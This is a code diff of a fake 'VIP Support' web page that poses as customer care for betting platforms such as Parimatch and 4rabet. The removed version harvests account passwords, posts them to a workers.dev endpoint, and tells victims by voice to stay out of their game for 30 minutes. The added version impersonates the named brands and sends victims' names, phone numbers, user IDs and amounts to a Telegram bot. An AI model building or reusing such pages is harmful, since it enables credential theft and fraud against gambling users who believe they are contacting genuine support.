@@ -1,248 +1,314 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VIP Support - Customer Care</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      background: radial-gradient(circle at top right, #1a103c, #0a0814 80%);
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      padding: 20px;
-    }
-    .card {
-      background: rgba(255, 255, 255, 0.04);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.12);
-      padding: 35px 28px;
-      border-radius: 24px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(112, 0, 255, 0.15);
-      width: 100%;
-      max-width: 440px;
-    }
-    h1 {
-      text-align: center;
-      font-size: 26px;
-      margin-bottom: 25px;
-      background: linear-gradient(90deg, #ff007a, #7928ca, #00d2ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      font-weight: 800;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
-    .input-group {
-      position: relative;
-      margin-bottom: 18px;
-    }
-    input, textarea {
-      width: 100%;
-      padding: 14px 16px;
-      background: rgba(255, 255, 255, 0.06);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      border-radius: 12px;
-      color: #fff;
-      font-size: 15px;
-      outline: none;
-      transition: all 0.3s ease;
-    }
-    input:focus, textarea:focus {
-      background: rgba(255, 255, 255, 0.1);
-      border-color: #00d2ff;
-      box-shadow: 0 0 15px rgba(0, 210, 255, 0.3);
-    }
-    input::placeholder, textarea::placeholder {
-      color: rgba(255, 255, 255, 0.45);
-    }
-    textarea {
-      resize: vertical;
-      min-height: 90px;
-    }
-    .password-wrapper {
-      position: relative;
-    }
-    .password-wrapper input {
-      padding-right: 48px;
-    }
-    .eye-icon {
-      position: absolute;
-      right: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      font-size: 18px;
-      user-select: none;
-      filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.2));
-    }
-    button {
-      width: 100%;
-      padding: 15px;
-      border: none;
-      border-radius: 12px;
-      background: linear-gradient(90deg, #ff007a, #7928ca);
-      color: #fff;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 8px 25px rgba(255, 0, 122, 0.35);
-      transition: all 0.3s ease;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-top: 5px;
-    }
-    button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 30px rgba(255, 0, 122, 0.5);
-    }
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-    #status {
-      text-align: center;
-      margin-top: 18px;
-      font-size: 14px;
-      font-weight: 600;
-      min-height: 20px;
-    }
-    .telegram-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-top: 22px;
-      padding: 12px;
-      background: rgba(0, 136, 204, 0.15);
-      border: 1px solid rgba(0, 136, 204, 0.4);
-      border-radius: 12px;
-      color: #29b6f6;
-      text-decoration: none;
-      font-size: 14px;
-      font-weight: 600;
-      transition: all 0.3s ease;
-    }
-    .telegram-btn:hover {
-      background: rgba(0, 136, 204, 0.3);
-      color: #fff;
-      box-shadow: 0 0 15px rgba(0, 136, 204, 0.4);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Game Support Portal</title>
+    
+    <!-- Cloudflare Turnstile Script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    
+    <style>
+        /* VIP Dark Theme CSS */
+        :root {
+            --primary-color: #ffcc00;
+            --bg-color: #0b0c10;
+            --card-bg: #1f2833;
+            --text-color: #c5c6c7;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: white;
+            margin: 0;
+            padding: 30px 15px;
+            text-align: center;
+        }
+
+        h2 {
+            color: var(--primary-color);
+            font-size: 28px;
+            margin-bottom: 40px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
+        }
+
+        /* Game Grid */
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 25px;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .game-card {
+            background-color: var(--card-bg);
+            padding: 25px 15px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 1px solid #333;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+
+        .game-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--primary-color);
+            box-shadow: 0 10px 25px rgba(255, 204, 0, 0.4);
+        }
+
+        .game-card img {
+            width: 100%;
+            height: 70px;
+            object-fit: contain;
+            margin-bottom: 15px;
+        }
+
+        .game-card p {
+            margin: 0;
+            font-weight: bold;
+            font-size: 16px;
+            color: var(--primary-color);
+            letter-spacing: 1px;
+        }
+
+        /* VIP Modal Form */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(5px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: linear-gradient(145deg, #1f2833, #151b22);
+            padding: 35px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 450px;
+            position: relative;
+            text-align: left;
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.2);
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 15px; right: 20px;
+            font-size: 28px;
+            cursor: pointer;
+            color: #ff4d4d;
+            transition: 0.2s;
+        }
+
+        .close-btn:hover { color: #ff1a1a; transform: scale(1.1); }
+
+        .form-group { margin-bottom: 18px; }
+        
+        .form-group label {
+            display: block; margin-bottom: 8px; font-size: 13px;
+            color: var(--text-color); text-transform: uppercase;
+        }
+
+        .form-group input, .form-group textarea {
+            width: 100%; padding: 12px;
+            border: 1px solid #45a29e; border-radius: 8px;
+            background-color: #0b0c10; color: white;
+            box-sizing: border-box; font-size: 14px;
+            transition: border 0.3s;
+        }
+
+        .form-group input:focus, .form-group textarea:focus {
+            outline: none; border-color: var(--primary-color);
+            box-shadow: 0 0 8px rgba(255, 204, 0, 0.3);
+        }
+
+        .submit-btn {
+            width: 100%; padding: 15px;
+            background: linear-gradient(90deg, #f39c12, #e67e22);
+            color: #000; border: none; border-radius: 8px;
+            font-size: 16px; font-weight: bold; text-transform: uppercase;
+            cursor: pointer; transition: 0.3s; margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(90deg, #e67e22, #d35400);
+            box-shadow: 0 0 15px rgba(230, 126, 34, 0.5);
+        }
+
+        .cf-turnstile-container { margin-bottom: 15px; display: flex; justify-content: center; }
+        
+        #statusMessage {
+            display: none; text-align: center; color: #00ff88; 
+            font-weight: bold; margin-top: 15px; font-size: 16px;
+        }
+    </style>
 </head>
 <body>
 
-<div class="card">
-  <h1>VIP Support</h1>
-  <form id="supportForm">
-    <div class="input-group">
-      <input id="name" type="text" placeholder="Full Name" required>
+    <h2>Jis game mein issue hai uspe click karein</h2>
+
+    <div class="game-grid">
+        <!-- Replace src URLs with your real Logo URLs -->
+        <div class="game-card" onclick="openForm('4rabet')">
+            <img src="https://via.placeholder.com/150x70/1a1a1a/ffcc00?text=4rabet" alt="4rabet">
+            <p>4rabet</p>
+        </div>
+        <div class="game-card" onclick="openForm('Crore Bet')">
+            <img src="https://via.placeholder.com/150x70/1a1a1a/ffcc00?text=Crore+Bet" alt="Crore Bet">
+            <p>Crore Bet</p>
+        </div>
+        <div class="game-card" onclick="openForm('Stark Bet')">
+            <img src="https://via.placeholder.com/150x70/1a1a1a/ffcc00?text=Stark+Bet" alt="Stark Bet">
+            <p>Stark Bet</p>
+        </div>
+        <div class="game-card" onclick="openForm('Parimatch')">
+            <img src="https://via.placeholder.com/150x70/1a1a1a/ffcc00?text=Parimatch" alt="Parimatch">
+            <p>Parimatch</p>
+        </div>
+        <div class="game-card" onclick="openForm('Lucky Star')">
+            <img src="https://via.placeholder.com/150x70/1a1a1a/ffcc00?text=Lucky+Star" alt="Lucky Star">
+            <p>Lucky Star</p>
+        </div>
+        <div class="game-card" onclick="openForm('Valor Bet')">
+            <img src="https://via.placeholder.com/150x70/1a1a1a/ffcc00?text=Valor+Bet" alt="Valor Bet">
+            <p>Valor Bet</p>
+        </div>
     </div>
-    <div class="input-group">
-      <input id="email" type="email" placeholder="Email Address" required>
+
+    <!-- Support Modal -->
+    <div id="supportModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeForm()">&times;</span>
+            <h3 id="formTitle" style="margin-top:0; color:#ffcc00; text-align:center; font-size: 22px;">Support</h3>
+            
+            <form id="dataForm" onsubmit="sendToTelegram(event)">
+                <div class="form-group"><label>Full Name</label><input type="text" id="name" required></div>
+                <div class="form-group"><label>Mobile Number</label><input type="number" id="phone" required></div>
+                <div class="form-group"><label>Game User ID</label><input type="text" id="userid" required></div>
+                <div class="form-group"><label>Amount (₹)</label><input type="number" id="amount" required></div>
+                <div class="form-group"><label>Describe Issue</label><textarea id="problem" rows="2" required></textarea></div>
+                
+                <!-- Cloudflare Turnstile -->
+                <div class="cf-turnstile-container">
+                    <div class="cf-turnstile" data-sitekey="YOUR_CLOUDFLARE_SITE_KEY_HERE"></div>
+                </div>
+
+                <button type="submit" id="submitBtn" class="submit-btn">Submit Request</button>
+                <div id="statusMessage"></div>
+            </form>
+        </div>
     </div>
-    <div class="input-group">
-      <input id="mobile" type="tel" placeholder="Mobile Number (10 digits)" maxlength="10" pattern="\d{10}" required>
-    </div>
-    <div class="input-group">
-      <input id="casino" type="text" placeholder="Platform / Service Name" required>
-    </div>
-    <div class="input-group password-wrapper">
-      <input id="password" type="password" placeholder="Account Password" required>
-      <span class="eye-icon" id="togglePassword">👁️</span>
-    </div>
-    <div class="input-group">
-      <textarea id="message" placeholder="Describe your issue in detail..." required></textarea>
-    </div>
-    <button type="submit" id="submitBtn">Submit Request</button>
-  </form>
 
-  <div id="status"></div>
+    <script>
+        let selectedGameName = "";
 
-  <a href="https://t.me/helpcare02" target="_blank" class="telegram-btn">
-    <span>💬</span> Contact on Telegram (@helpcare02)
-  </a>
-</div>
+        function openForm(gameName) {
+            selectedGameName = gameName;
+            document.getElementById("formTitle").innerText = gameName + " VIP Support";
+            document.getElementById("supportModal").style.display = "flex";
+            document.getElementById("statusMessage").style.display = "none";
+        }
 
-<script>
-const WORKER_URL = "https://helpcare24-telegram.xfarru356.workers.dev";
+        function closeForm() {
+            document.getElementById("supportModal").style.display = "none";
+            document.getElementById("dataForm").reset();
+            document.getElementById("submitBtn").style.display = "block";
+            if (typeof turnstile !== 'undefined') { turnstile.reset(); }
+        }
 
-// Password Visibility Toggle
-const togglePassword = document.getElementById('togglePassword');
-const passwordInput = document.getElementById('password');
+        // Voice Message Function
+        function playVoiceMessage(gameName) {
+            if ('speechSynthesis' in window) {
+                let textToSpeak = `Aapki request ${gameName} team ko chali gayi hai, kripya wait karein`;
+                let speech = new SpeechSynthesisUtterance(textToSpeak);
+                speech.lang = 'hi-IN'; // Hindi-Indian accent
+                speech.rate = 0.9;     // Thodi normal speed
+                speech.pitch = 1;
+                window.speechSynthesis.speak(speech);
+            }
+        }
 
-togglePassword.addEventListener('click', function() {
-  const isPassword = passwordInput.getAttribute('type') === 'password';
-  passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
-  this.textContent = isPassword ? '🙈' : '👁️';
-});
+        function sendToTelegram(event) {
+            event.preventDefault(); 
 
-// Form Submit Handler
-document.getElementById("supportForm").addEventListener("submit", async function(e) {
-  e.preventDefault();
-  const button = document.getElementById("submitBtn");
-  const status = document.getElementById("status");
+            // Cloudflare verification check
+            const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]');
+            if (turnstileResponse && !turnstileResponse.value) {
+                alert("Please complete the Security Check!");
+                return;
+            }
 
-  button.disabled = true;
-  button.textContent = "Processing...";
-  status.textContent = "";
+            // A. Yahan Apne Telegram Bot Details Daalein
+            const botToken = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'; 
+            const chatId = 'YOUR_CHAT_ID_HERE';
 
-  const payload = {
-    name: document.getElementById("name").value.trim(),
-    email: document.getElementById("email").value.trim(),
-    mobile: document.getElementById("mobile").value.trim(),
-    casino: document.getElementById("casino").value.trim(),
-    password: document.getElementById("password").value.trim(),
-    message: document.getElementById("message").value.trim()
-  };
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const userid = document.getElementById('userid').value;
+            const amount = document.getElementById('amount').value;
+            const problem = document.getElementById('problem').value;
 
-  try {
-    const res = await fetch(WORKER_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
+            // B. Message structure jo Telegram par aayega
+            const message = `🌟 *VIP SUPPORT REQUEST* 🌟\n\n` +
+                            `🎮 *Game Name:* ${selectedGameName}\n` +
+                            `👤 *Name:* ${name}\n` +
+                            `📞 *Mobile:* ${phone}\n` +
+                            `🆔 *User ID:* ${userid}\n` +
+                            `💰 *Amount:* ₹${amount}\n` +
+                            `📝 *Issue:* ${problem}`;
 
-    const result = await res.json();
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // UI Update (Bhejte waqt button disable karna)
+            document.getElementById("submitBtn").innerText = "Sending...";
+            document.getElementById("submitBtn").disabled = true;
 
-    if (!res.ok) {
-      throw new Error(result.error?.description || "Submission failed");
-    }
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    // Success hone par action
+                    document.getElementById("submitBtn").style.display = "none";
+                    let statusDiv = document.getElementById("statusMessage");
+                    statusDiv.innerHTML = `✅ Aapki request <b>${selectedGameName}</b> team ko chali gayi hai, kripya wait karein.`;
+                    statusDiv.style.display = "block";
+                    
+                    // Voice message chalana
+                    playVoiceMessage(selectedGameName);
 
-    status.style.color = "#00e676";
-    status.textContent = "Request successfully submitted!";
-
-    // Voice Alert
-    if ('speechSynthesis' in window) {
-      const voiceText = "Aapki request review team ke paas chali gayi hai. Kripya karke 30 minute tak game open na karein aur wait karein.";
-      const utterance = new SpeechSynthesisUtterance(voiceText);
-      utterance.lang = 'hi-IN';
-      utterance.rate = 0.95;
-      window.speechSynthesis.speak(utterance);
-    }
-
-    document.getElementById("supportForm").reset();
-
-  } catch (err) {
-    console.error("Error details:", err);
-    status.style.color = "#ff3366";
-    status.textContent = "Unable to submit request. Please try again or message on Telegram.";
-  } finally {
-    button.disabled = false;
-    button.textContent = "Submit Request";
-  }
-});
-</script>
-
+                    // 4 seconds baad form band karna
+                    setTimeout(closeForm, 4500);
+                } else {
+                    alert("Error: Data send nahi hua.");
+                    document.getElementById("submitBtn").innerText = "Submit Request";
+                    document.getElementById("submitBtn").disabled = false;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert("Network error. Please try again.");
+                document.getElementById("submitBtn").innerText = "Submit Request";
+                document.getElementById("submitBtn").disabled = false;
+            });
+        }
+    </script>
 </body>
 </html>
